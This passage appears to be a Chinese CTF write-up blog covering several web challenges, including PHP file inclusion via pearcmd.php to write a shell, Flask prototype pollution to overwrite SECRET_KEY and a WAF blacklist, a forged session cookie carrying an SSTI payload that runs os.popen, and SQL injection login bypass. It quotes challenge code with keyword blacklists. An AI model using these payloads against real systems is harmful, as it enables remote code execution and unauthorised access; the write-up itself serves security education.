+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/011ba042a0b22b459bb607f63861bdfd.png"></p>
+<p>or</p>
+<p>发现不能⽤php伪协议，也不能直接 / 开头和⽤ ../  ，但能⽤file协议 可以包含 pearcmd.php  来写⻢实现getshell 1 代码块 <code>/tips.php?+config-create+/&amp;file=file:///usr/local/lib/php/pearcmd&amp;/+test.php</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/96993855bafcb52794d39e50242a93c6.png"></p>
+<hr>
+<h3 id="芙宁娜的图片"><a href="#芙宁娜的图片" class="headerlink" title="芙宁娜的图片"></a>芙宁娜的图片</h3><p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/brainfuck">Brainfuck/OoK加密解密 - Bugku CTF平台</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e0eb9c2c67ed5784bf182853b1f8371f.png"></p>
+<p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/vigenere">https://ctf.bugku.com/tool/vigenere</a></p>
+<p>（key在图片信息中）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f5ae16ca942a20d4d660e685b34033ba.png"></p>
+<hr>
+<h3 id="奇怪的咖啡店"><a href="#奇怪的咖啡店" class="headerlink" title="奇怪的咖啡店"></a>奇怪的咖啡店</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12518">浅谈Python原型链污染及利用方式-先知社区</a></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, session, request, render_template_string, render_template</span><br><span class="line">import json</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config['SECRET_KEY'] = os.urandom(32).hex()</span><br><span class="line"></span><br><span class="line">@app.route('/', methods=['GET', 'POST'])</span><br><span class="line">def store():</span><br><span class="line">    if not session.get('name'):</span><br><span class="line">        session['name'] = ''.join("customer")</span><br><span class="line">        session['permission'] = 0</span><br><span class="line"></span><br><span class="line">    error_message = ''</span><br><span class="line">    if request.method == 'POST':</span><br><span class="line">        error_message = '&lt;p style="color: red; font-size: 0.8em;"&gt;该商品暂时无法购买，请稍后再试！&lt;/p&gt;'</span><br><span class="line"></span><br><span class="line">    products = [</span><br><span class="line">        {"id": 1, "name": "美式咖啡", "price": 9.99, "image": "1.png"},</span><br><span class="line">        {"id": 2, "name": "橙c美式", "price": 19.99, "image": "2.png"},</span><br><span class="line">        {"id": 3, "name": "摩卡", "price": 29.99, "image": "3.png"},</span><br><span class="line">        {"id": 4, "name": "卡布奇诺", "price": 19.99, "image": "4.png"},</span><br><span class="line">        {"id": 5, "name": "冰拿铁", "price": 29.99, "image": "5.png"}</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    return render_template('index.html',</span><br><span class="line">                         error_message=error_message,</span><br><span class="line">                         session=session,</span><br><span class="line">                         products=products)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route('/add', methods=['POST', 'GET'])</span><br><span class="line">def adddd():</span><br><span class="line">    if request.method == 'GET':</span><br><span class="line">        return '''</span><br><span class="line">            &lt;html&gt;</span><br><span class="line">                &lt;body style="background-image: url('/static/img/7.png'); background-size: cover; background-repeat: no-repeat;"&gt;</span><br><span class="line">                    &lt;h2&gt;添加商品&lt;/h2&gt;</span><br><span class="line">                    &lt;form id="productForm"&gt;</span><br><span class="line">                        &lt;p&gt;商品名称: &lt;input type="text" id="name"&gt;&lt;/p&gt;</span><br><span class="line">                        &lt;p&gt;商品价格: &lt;input type="text" id="price"&gt;&lt;/p&gt;</span><br><span class="line">                        &lt;button type="button" onclick="submitForm()"&gt;添加商品&lt;/button&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                    &lt;script&gt;</span><br><span class="line">                        function submitForm() {</span><br><span class="line">                            const nameInput = document.getElementById('name').value;</span><br><span class="line">                            const priceInput = document.getElementById('price').value;</span><br><span class="line"></span><br><span class="line">                            fetch(`/add?price=${encodeURIComponent(priceInput)}`, {</span><br><span class="line">                                method: 'POST',</span><br><span class="line">                                headers: {</span><br><span class="line">                                    'Content-Type': 'application/json',</span><br><span class="line">                                },</span><br><span class="line">                                body: nameInput</span><br><span class="line">                            })</span><br><span class="line">                            .then(response =&gt; response.text())</span><br><span class="line">                            .then(data =&gt; alert(data))</span><br><span class="line">                            .catch(error =&gt; console.error('错误:', error));</span><br><span class="line">                        }</span><br><span class="line">                    &lt;/script&gt;</span><br><span class="line">                &lt;/body&gt;</span><br><span class="line">            &lt;/html&gt;</span><br><span class="line">        '''</span><br><span class="line">    elif request.method == 'POST':</span><br><span class="line">        if request.data:</span><br><span class="line">            try:</span><br><span class="line">                raw_data = request.data.decode('utf-8')</span><br><span class="line">                if check(raw_data):</span><br><span class="line">                #检测添加的商品是否合法</span><br><span class="line">                    return "该商品违规，无法上传"</span><br><span class="line">                json_data = json.loads(raw_data)</span><br><span class="line"></span><br><span class="line">                if not isinstance(json_data, dict):</span><br><span class="line">                    return "添加失败1"</span><br><span class="line"></span><br><span class="line">                merge(json_data, add)</span><br><span class="line">                return "你无法添加商品哦"</span><br><span class="line"></span><br><span class="line">            except (UnicodeDecodeError, json.JSONDecodeError):</span><br><span class="line">                return "添加失败2"</span><br><span class="line">            except TypeError as e:</span><br><span class="line">                return f"添加失败3"</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return f"添加失败4"</span><br><span class="line">        return "添加失败5"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, '__getitem__'):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host="0.0.0.0",port=5014)</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>在 <code>/add</code> 路由中，合并操作的目标是 <code>add</code> 函数（代码中 <code>merge(json_data, add)</code>）</p>
+<p>要修改 <code>app.config['SECRET_KEY']</code>，我们需要通过属性链访问：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add (函数) → __globals__ (模块全局变量) → app (Flask 实例) → config (配置字典) → SECRET_KEY</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><p><code>__init__</code> 是类构造方法，与我们要访问的全局变量无关</p>
+</li>
+<li><p>在 <code>add</code> 函数对象上：</p>
+<ul>
+<li><p><code>add.__init__</code> 存在（所有对象都有）</p>
+</li>
+<li><p>但 <code>add.__init__.__globals__</code> 不存在（因为 <code>__init__</code> 是方法，不是函数）</p>
+</li>
+<li><p>尝试访问 <code>add.__init__.__globals__</code> 实际访问的是 <code>type(add).__init__.__globals__</code>（即类构造方法的全局变量），这不是我们需要的</p>
+</li>
+<li><pre><code>type(add).__init__.__globals__  # 这是类构造方法的全局变量
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    - 这个命名空间不包含 Flask `app` 实例</span><br><span class="line">    - 修改这里不会影响应用配置</span><br><span class="line"></span><br><span class="line">```json</span><br><span class="line">{</span><br><span class="line">       "\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f": {</span><br><span class="line">         "\u0061\u0070\u0070": {</span><br><span class="line">           "\u0063\u006F\u006E\u0066\u0069\u0067": {</span><br><span class="line">             "\u0053\u0045\u0043\u0052\u0045\u0054\u005F\u004B\u0045\u0059": "hack"</span><br><span class="line">           }</span><br><span class="line">         }</span><br><span class="line">       }</span><br><span class="line">     </span><br></pre></td></tr></tbody></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line"># Flask 应用实例</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = "hack"  # 设置应用的 secret_key</span><br><span class="line"></span><br><span class="line"># 会话数据</span><br><span class="line">session_data = {'name': 'admin', 'permission': '{{self.__init__.__globals__.__builtins__["__import__"]("os").popen("ls /").read()}}'}</span><br><span class="line"></span><br><span class="line"># 获取会话签名序列化器</span><br><span class="line">session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">cookie = session_serializer.dumps(session_data)</span><br><span class="line"></span><br><span class="line">print("伪造的 session cookie:", cookie)</span><br><span class="line"></span><br><span class="line">#伪造的 session cookie: .eJwdisEKAjEMBX9F3mkXZL37K1ZKl40SSJPSrKfSfzd6mxlmQEsl3FGOyoorGvXK7mwacQwneW05s_KZc8BbbC_if94_LCdryCMhntqsx5XwXBLME9atWSMNE7_cft6pHMs6J-YXPokqFg.aEfEYw.RwLFBiWD42THkrSjh8h9RXCJTyg</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span><span class="attr">"__globals__"</span><span class="punctuation">:</span><span class="punctuation">{</span><span class="attr">"app"</span><span class="punctuation">:</span><span class="punctuation">{</span><span class="attr">"_static_folder"</span><span class="punctuation">:</span><span class="string">"/"</span><span class="punctuation">}</span><span class="punctuation">}</span><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p> <code>json_data = json.loads(raw_data)</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/de7cc48d358d3a3fbce6ff181c95d0ab.png"></p>
+<figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span><span class="attr">"\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F"</span><span class="punctuation">:</span><span class="punctuation">{</span><span class="attr">"\u0061\u0070\u0070"</span><span class="punctuation">:</span><span class="punctuation">{</span><span class="attr">"\u005F\u0073\u0074\u0061\u0074\u0069\u0063\u005F\u0066\u006F\u006C\u0064\u0065\u0072"</span><span class="punctuation">:</span><span class="string">"\u002F"</span><span class="punctuation">}</span><span class="punctuation">}</span><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Unicode编码后访问<code>/static/proc/1/environ</code>即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/de8b05965001bce7d59cfc7ba8767b1f.png"></p>
+<p><code>/static/app/app.py</code></p>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, session, request, render_template_string, render_template</span><br><span class="line">import json</span><br><span class="line">import os</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">@app.route('/aaadminnn', methods=['GET', 'POST'])</span><br><span class="line">def admin():</span><br><span class="line">    if session.get('name') == "admin" and session.get('permission') != 0:</span><br><span class="line">        permission = session.get('permission')</span><br><span class="line">        if check1(permission):</span><br><span class="line">            # 检测添加的商品是否合法</span><br><span class="line">            return "非法权限"</span><br><span class="line"></span><br><span class="line">        if request.method == 'POST':</span><br><span class="line">            return '&lt;script&gt;alert("上传成功！");window.location.href="/aaadminnn";&lt;/script&gt;'</span><br><span class="line"></span><br><span class="line">        upload_form = '''</span><br><span class="line">        &lt;h2&gt;商品管理系统&lt;/h2&gt;</span><br><span class="line">        &lt;form method=POST enctype=multipart/form-data style="margin:20px;padding:20px;border:1px solid #ccc"&gt;</span><br><span class="line">            &lt;h3&gt;上传新商品&lt;/h3&gt;</span><br><span class="line">            &lt;input type=file name=file required style="margin:10px"&gt;&lt;br&gt;</span><br><span class="line">            &lt;small&gt;支持格式：jpg/png（最大2MB）&lt;/small&gt;&lt;br&gt;</span><br><span class="line">            &lt;input type=submit value="立即上传" style="margin:10px;padding:5px 20px"&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        '''</span><br><span class="line"></span><br><span class="line">        original_template = 'Hello admin!!!Your permissions are{}'.format(permission)</span><br><span class="line">        new_template = original_template + upload_form</span><br><span class="line"></span><br><span class="line">        return render_template_string(new_template)</span><br><span class="line">    else:</span><br><span class="line">        return "&lt;script&gt;alert('You are not an admin');window.location.href='/'&lt;/script&gt;"</span><br><span class="line">    </span><br><span class="line">def check(raw_data, forbidden_keywords=None):</span><br><span class="line">    """</span><br><span class="line">    检查原始数据中是否包含禁止的关键词</span><br><span class="line">    如果包含禁止关键词返回 True，否则返回 False</span><br><span class="line">    """</span><br><span class="line">    # 设置默认禁止关键词</span><br><span class="line">    if forbidden_keywords is None:</span><br><span class="line">        forbidden_keywords = ["app", "config", "init", "globals", "flag", "SECRET", "pardir", "class", "mro", "subclasses", "builtins", "eval", "os", "open", "file", "import", "cat", "ls", "/", "base", "url", "read"]</span><br><span class="line"></span><br><span class="line">    # 检查是否包含任何禁止关键词</span><br><span class="line">    return any(keyword in raw_data for keyword in forbidden_keywords)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param_black_list = ['config', 'session', 'url', '\\', '&lt;', '&gt;', '%1c', '%1d', '%1f', '%1e', '%20', '%2b', '%2c', '%3c', '%3e', '%c', '%2f',</span><br><span class="line">                    'b64decode', 'base64', 'encode', 'chr', '[', ']', 'os', 'cat',  'flag',  'set',  'self', '%', 'file',  'pop(',</span><br><span class="line">                    'setdefault', 'char', 'lipsum', 'update', '=', 'if', 'print', 'env', 'endfor', 'code', '=' ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 增强WAF防护</span><br><span class="line">def waf_check(value):</span><br><span class="line">    # 检查是否有不合法的字符</span><br><span class="line">    for black in param_black_list:</span><br><span class="line">        if black in value:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"># 检查是否是自动化工具请求</span><br><span class="line">def is_automated_request():</span><br><span class="line">    user_agent = request.headers.get('User-Agent', '').lower()</span><br><span class="line">    # 如果是常见的自动化工具的 User-Agent，返回 True</span><br><span class="line">    automated_agents = ['fenjing', 'curl', 'python', 'bot', 'spider']</span><br><span class="line">    return any(agent in user_agent for agent in automated_agents)</span><br><span class="line"></span><br><span class="line">def check1(value):</span><br><span class="line"></span><br><span class="line">    if is_automated_request():</span><br><span class="line">        print("Automated tool detected")</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    # 使用WAF机制检查请求的合法性</span><br><span class="line">    if not waf_check(value):</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host="0.0.0.0",port=5014)</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//污染</span><br><span class="line">{"__globals__" : {"param_black_list" : ["123"]}}</span><br><span class="line">{"\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f" : {"\u0070\u0061\u0072\u0061\u006d\u005f\u0062\u006c\u0061\u0063\u006b\u005f\u006c\u0069\u0073\u0074" : ["123"]}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/592fa2f223332c1ff50a69d40396a729.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3d45851a0f890ea420ea70686d5d31cc.png"></p>
+<hr>
+<h3 id="半成品login"><a href="#半成品login" class="headerlink" title="半成品login"></a>半成品login</h3><p>先admin,admin123登陆，再发现要以hacker****为用户名。发现password处可注入。</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">2527</span><span class="comment">/**/</span><span class="operator">||</span><span class="comment">/**/</span><span class="number">1</span>#</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c77fab20b98e9f775f458549ad8dc4fd.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=q&amp;password=username=fake%2527/**/||/**/username/**/like/**/%2527hacker%%2527#</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = '$input' AND password = '$password';</span><br></pre></td></tr></tbody></table></figure>
+
+<p>注入后变为：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = 'fake' OR username LIKE 'hacker%' #' AND password = '...';</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><code>'fake' OR username LIKE 'hacker%'</code>：通过<code>OR</code>使条件恒真，可查询所有用户名以<code>hacker</code>开头的用户。</li>
+<li><code>#</code>：注释掉后续的密码验证部分，绕过登录验证。</li>
+</ul>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/de92f29c87112ff359a5a2c2978318d7.png"></p>
+<hr>
+<h3 id="WEB-RE-Just-Ping-Part-1"><a href="#WEB-RE-Just-Ping-Part-1" class="headerlink" title="[WEB+RE]Just Ping Part 1"></a>[WEB+RE]Just Ping Part 1</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">document.addEventListener('DOMContentLoaded', function() {</span><br><span class="line">           const targetInput = document.getElementById('targetInput');</span><br><span class="line">           const pingButton = document.getElementById('pingButton');</span><br><span class="line">           const stopButton = document.getElementById('stopButton');</span><br><span class="line">           const output = document.getElementById('output');</span><br><span class="line">           let controller = null;</span><br><span class="line"></span><br><span class="line">           // 自动滚动到底部</span><br><span class="line">           function scrollToBottom() {</span><br><span class="line">               output.scrollTop = output.scrollHeight;</span><br><span class="line">           }</span><br><span class="line"></span><br><span class="line">           // 清除输出</span><br><span class="line">           function clearOutput() {</span><br><span class="line">               output.textContent = '';</span><br><span class="line">           }</span><br><span class="line"></span><br><span class="line">           // 开始 ping</span><br><span class="line">           pingButton.addEventListener('click', async function() {</span><br><span class="line">               const target = targetInput.value.trim();</span><br><span class="line">               if (!target) {</span><br><span class="line">                   alert('请输入有效的 IP 地址或域名');</span><br><span class="line">                   return;</span><br><span class="line">               }</span><br><span class="line"></span><br><span class="line">               clearOutput();</span><br><span class="line">               pingButton.disabled = true;</span><br><span class="line">               stopButton.disabled = false;</span><br><span class="line">               targetInput.disabled = true;</span><br><span class="line"></span><br><span class="line">               // 使用 AbortController 来控制请求</span><br><span class="line">               controller = new AbortController();</span><br><span class="line">               const signal = controller.signal;</span><br><span class="line"></span><br><span class="line">               try {</span><br><span class="line">                   const response = await fetch(`/api/ping?target=${encodeURIComponent(target)}`, {</span><br><span class="line">                       signal</span><br><span class="line">                   });</span><br><span class="line"></span><br><span class="line">                   if (!response.ok) {</span><br><span class="line">                       throw new Error(`请求失败: ${response.status}`);</span><br><span class="line">                   }</span><br><span class="line"></span><br><span class="line">                   const reader = response.body.getReader();</span><br><span class="line">                   const decoder = new TextDecoder();</span><br><span class="line"></span><br><span class="line">                   while (true) {</span><br><span class="line">                       const { done, value } = await reader.read();</span><br><span class="line">                       if (done) break;</span><br><span class="line"></span><br><span class="line">                       const text = decoder.decode(value);</span><br><span class="line">                       output.textContent += text;</span><br><span class="line">                       scrollToBottom();</span><br><span class="line">                   }</span><br><span class="line">               } catch (error) {</span><br><span class="line">                   if (error.name !== 'AbortError') {</span><br><span class="line">                       output.textContent += `\n错误: ${error.message}\n`;</span><br><span class="line">                       scrollToBottom();</span><br><span class="line">                   }</span><br><span class="line">               } finally {</span><br><span class="line">                   pingButton.disabled = false;</span><br><span class="line">                   stopButton.disabled = true;</span><br><span class="line">                   targetInput.disabled = false;</span><br><span class="line">                   controller = null;</span><br><span class="line">               }</span><br><span class="line">           });</span><br><span class="line"></span><br><span class="line">           // 停止 ping</span><br><span class="line">           stopButton.addEventListener('click', function() {</span><br><span class="line">               if (controller) {</span><br><span class="line">                   controller.abort();</span><br><span class="line">               }</span><br><span class="line">               pingButton.disabled = false;</span><br><span class="line">               stopButton.disabled = true;</span><br><span class="line">               targetInput.disabled = false;</span><br><span class="line">           });</span><br><span class="line"></span><br><span class="line">           // 按回车键触发 ping</span><br><span class="line">           targetInput.addEventListener('keypress', function(e) {</span><br><span class="line">               if (e.key === 'Enter' &amp;&amp; !pingButton.disabled) {</span><br><span class="line">                   pingButton.click();</span><br><span class="line">               }</span><br><span class="line">           });</span><br><span class="line">       });</span><br><span class="line"></span><br><span class="line">       // 测试开发API</span><br><span class="line">       document.getElementById('testApiButton').addEventListener('click', async function() {</span><br><span class="line">           const cmd = targetInput.value.trim();</span><br><span class="line">           if (!cmd) {</span><br><span class="line">               alert('请输入测试命令');</span><br><span class="line">               return;</span><br><span class="line">           }</span><br><span class="line"></span><br><span class="line">           clearOutput();</span><br><span class="line">           testApiButton.disabled = true;</span><br><span class="line">           targetInput.disabled = true;</span><br><span class="line"></span><br><span class="line">           try {</span><br><span class="line">               const response = await fetch(`/api/testDevelopApi?cmd=${encodeURIComponent(cmd)}`);</span><br><span class="line">               if (!response.ok) {</span><br><span class="line">                   throw new Error(`请求失败: ${response.status}`);</span><br><span class="line">               }</span><br><span 